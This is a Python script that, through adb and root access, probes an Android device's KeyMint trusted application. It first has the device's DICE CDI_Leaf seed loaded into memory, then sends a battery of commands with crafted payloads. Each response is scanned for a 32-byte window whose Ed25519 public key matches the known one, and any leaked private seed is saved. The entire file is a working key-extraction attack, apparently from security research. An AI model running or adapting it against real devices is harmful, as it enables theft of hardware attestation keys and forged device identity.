#!/usr/bin/env python3
"""kmcli battery: run read-only KeyMint cmds, save responses, scan for CDI_Leaf seed.
Seed detector: 32B window whose Ed25519 pubkey == cdi_leaf_pub.bin.
"""
import subprocess
import sys

PUB = open("cdi_leaf_pub.bin", "rb").read()
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat

def seed_offsets(buf):
    hits = []
    for off in range(0, len(buf) - 32):
        w = buf[off:off + 32]
        if w in (b"\x00" * 32, b"\xff" * 32):
            continue
        try:
            pub = Ed25519PrivateKey.from_private_bytes(w).public_key().public_bytes(
                Encoding.Raw, PublicFormat.Raw)
            if pub == PUB:
                hits.append(off)
        except Exception:
            pass
    return hits

def run(cmd_hex, payload_hex=""):
    out = f"/data/local/tmp/resp_{cmd_hex}.bin"
    remote = (f"su -c 'KMCLI_OUT={out} /data/local/tmp/kmcli {cmd_hex} {payload_hex}; "
              f"chmod 644 {out} 2>/dev/null'")
    r = subprocess.run(["adb", "shell", remote], capture_output=True, text=True,
                       env=ENV)
    return r.stdout

import os, time

ENV = dict(os.environ)
ENV["MSYS_NO_PATHCONV"] = "1"

# 0: fresh CSR via Android path (seed -> TA heap)
subprocess.run(["adb", "shell", "cmd remote_provisioning csr default > /dev/null 2>&1"],
               env=ENV)
print("[*] CSR triggered (seed on heap)")

TESTS = [
    ("311f", ""), ("219", ""), ("3126", "a1183700"), ("21004", ""),
    ("311e", ""), ("3122", ""), ("3124", ""), ("3125", ""),
    ("220e", ""), ("311c", ""), ("210c", ""), ("3122", "a10440"),
    ("3122", "a1045010101010101010101010101010101010"),
    ("311e", "a10440"),
]
for cmd, pl in TESTS:
    out = run(cmd, pl)
    rc = "?"
    for line in out.splitlines():
        if "TA retcode" in line:
            rc = line.strip()
    local = f"resp_{cmd}.bin"
    subprocess.run(["adb", "pull", f"/data/local/tmp/resp_{cmd}.bin", local],
                   capture_output=True, env=ENV)
    note = ""
    if os.path.exists(local):
        data = open(local, "rb").read()
        hits = seed_offsets(data)
        pub_at = data.find(PUB)
        note = f"len={len(data)} pub_at={hex(pub_at) if pub_at>=0 else '-'} SEED={[hex(h) for h in hits] if hits else '-'}"
        if hits:
            print(f"!!!!!! SEED LEAKED via cmd {cmd} offset {[hex(h) for h in hits]}")
            open("SEED_LEAKED.bin", "wb").write(data)
    print(f"cmd {cmd:6s} pl={pl[:20]:22s} {rc} | {note}")
print("done")
